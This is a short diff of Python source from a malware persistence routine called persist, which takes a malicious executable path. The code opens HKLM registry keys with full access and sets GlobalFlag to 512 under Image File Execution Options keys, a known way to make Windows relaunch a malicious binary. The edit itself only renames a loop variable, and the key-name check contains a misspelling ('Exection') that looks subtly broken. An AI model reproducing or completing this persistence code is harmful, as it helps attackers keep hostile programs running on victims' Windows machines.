@@ -57,7 +57,7 @@ def persist(malicious_exe_path:str, target_exe:str, target_reg_keys:list):
     CreateKeyEx(hklm, target_reg_keys[1], 0, KEY_WRITE)
     for reg_key in target_reg_keys:
       with OpenKey(hklm, reg_key, 0, KEY_ALL_ACCESS) as target_key:
-        for i in range(QueryInfoKey(target_key)[0]):
+        for _ in range(QueryInfoKey(target_key)[0]):
           if "Image File Exection" in reg_key:
             SetValueEx(hklm, "GlobalFlag", 0, REG_DWORD, 512)
           else:
